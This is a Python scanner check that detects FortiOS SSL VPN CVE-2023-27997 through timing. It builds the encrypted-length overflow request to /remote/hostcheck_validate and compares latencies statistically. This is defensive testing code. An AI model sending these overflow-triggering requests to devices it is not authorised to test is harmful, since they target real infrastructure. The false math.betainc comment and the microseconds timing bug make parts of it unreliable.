"""
CVE-2023-27997
FortiOS SSL VPN heap-based buffer overflow — timing-based detection.
Sends pairs of requests with valid vs. oversized payloads and uses a
Welch's t-test on response latencies to distinguish vulnerable from
patched devices without triggering a crash.
Affected: FortiOS 6.0.x, 6.2.x, 6.4.x, 7.0.x, 7.2.x before June 2023 patches.
"""

import hashlib
import math
import re
import statistics
import struct

import requests
import urllib3

from .base import BaseCheck, CheckResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_REQUESTS_PER_GROUP = 400


# ── Pure-Python statistics helpers (replaces numpy + scipy) ──────────────────

def _quantile_75(data: list) -> float:
    s = sorted(data)
    n = len(s)
    idx = 0.75 * (n - 1)
    lo = int(idx)
    hi = min(lo + 1, n - 1)
    return s[lo] + (idx - lo) * (s[hi] - s[lo])


def _reject_outliers(data: list) -> list:
    q3 = _quantile_75(data)
    return [x for x in data if x <= q3]


def _welch_ttest(a: list, b: list) -> tuple:
    """Welch's t-test. Returns (t_statistic, p_value)."""
    n1, n2 = len(a), len(b)
    if n1 < 2 or n2 < 2:
        return 0.0, 1.0
    m1, m2 = statistics.mean(a), statistics.mean(b)
    v1, v2 = statistics.variance(a), statistics.variance(b)
    se = math.sqrt(v1 / n1 + v2 / n2)
    if se == 0:
        return 0.0, 1.0
    t = (m1 - m2) / se
    # Welch-Satterthwaite degrees of freedom
    df = (v1 / n1 + v2 / n2) ** 2 / (
        (v1 / n1) ** 2 / (n1 - 1) + (v2 / n2) ** 2 / (n2 - 1)
    )
    # Two-tailed p-value via regularised incomplete beta (Python 3.11+)
    # or normal approximation fallback (accurate for df > 30, which is
    # always the case here given our minimum sample sizes).
    x = df / (df + t * t)
    try:
        p = math.betainc(df / 2, 0.5, x)          # Python 3.11+
    except AttributeError:
        p = math.erfc(abs(t) / math.sqrt(2))       # normal approximation
    return t, p


# ── Request helpers ───────────────────────────────────────────────────────────

def _gen_enc_hdr(salt: bytes, length: int) -> str:
    magic = b"GCC is the GNU Compiler Collection."
    ks = hashlib.md5(salt + b"00bfbfbf" + magic).digest()
    packed = struct.pack("<H", length)
    return "00bfbfbf{:02x}{:02x}".format(packed[0] ^ ks[0], packed[1] ^ ks[1])


def _make_req(session: requests.Session, baseurl: str, salt: bytes,
              alloc_size: int, req_size: int) -> requests.Response:
    payload = (
        "ajax=1&username=test&realm=&enc="
        + _gen_enc_hdr(salt, req_size)
        + "41" * alloc_size
    )
    return session.post(
        f"{baseurl}/remote/hostcheck_validate",
        headers={"content-type": "application/x-www-form-urlencoded"},
        verify=False,
        data=payload,
    )


# ── Check ─────────────────────────────────────────────────────────────────────

class CVE_2023_27997(BaseCheck):
    CVE_ID = "CVE-2023-27997"
    DESCRIPTION = "SSL VPN Heap Buffer Overflow — Timing-Based Detection"
    AFFECTED_VERSIONS = (
        "FortiOS 6.0.x / 6.2.x / 6.4.x / 7.0.x / 7.2.x "
        "before June 2023 security releases"
    )

    def check(self, host: str, port: int, **kwargs) -> CheckResult:
        target = f"{host}:{port}"
        baseurl = f"https://{target}"

        try:
            r = requests.get(f"{baseurl}/remote/info", verify=False, timeout=15)
        except Exception as e:
            return CheckResult(self.CVE_ID, target, "ERROR",
                               f"Could not reach /remote/info: {e}")

        matches = re.findall(r"salt='([0-9a-f]{8})'", r.text)
        if len(matches) != 1:
            return CheckResult(self.CVE_ID, target, "UNKNOWN",
                               "Could not retrieve salt — target may not be a FortiGate SSL VPN")

        salt = matches[0].encode()
        alloc_size = 0xF800
        overflow_times: list = []
        regular_times: list = []
        session = requests.Session()

        try:
            for i in range(_REQUESTS_PER_GROUP):
                r1 = _make_req(session, baseurl, salt, alloc_size, alloc_size + 0xF0)
                overflow_times.append(r1.elapsed.microseconds)

                r2 = _make_req(session, baseurl, salt, alloc_size, alloc_size // 2)
                regular_times.append(r2.elapsed.microseconds)

                if i > 20 and i % 10 == 0:
                    t, p = _welch_ttest(
                        _reject_outliers(overflow_times),
                        _reject_outliers(regular_times),
                    )
                    if p < 0.001:
                        break
        except Exception as e:
            return CheckResult(self.CVE_ID, target, "ERROR",
                               f"Request error during timing probe: {e}")

        t_stat, p_val = _welch_ttest(
            _reject_outliers(overflow_times),
            _reject_outliers(regular_times),
        )

        low_confidence = p_val > 0.001 or (-2 < t_stat < 2)
        confidence = "low confidence — " if low_confidence else ""

        if t_stat > 0.5:
            return CheckResult(
                self.CVE_ID, target, "VULNERABLE",
                f"{confidence}timing delta indicates unpatched heap allocator "
                f"(t={t_stat:.3f}, p={p_val:.4f})",
                {"t_statistic": t_stat, "p_value": p_val, "low_confidence": low_confidence},
            )
        elif t_stat < -0.5:
            return CheckResult(
                self.CVE_ID, target, "PATCHED",
                f"{confidence}no significant timing delta detected "
                f"(t={t_stat:.3f}, p={p_val:.4f})",
                {"t_statistic": t_stat, "p_value": p_val, "low_confidence": low_confidence},
            )
        else:
            return CheckResult(
                self.CVE_ID, target, "UNKNOWN",
                f"Inconclusive timing results (t={t_stat:.3f}, p={p_val:.4f})",
                {"t_statistic": t_stat, "p_value": p_val, "low_confidence": low_confidence},
            )
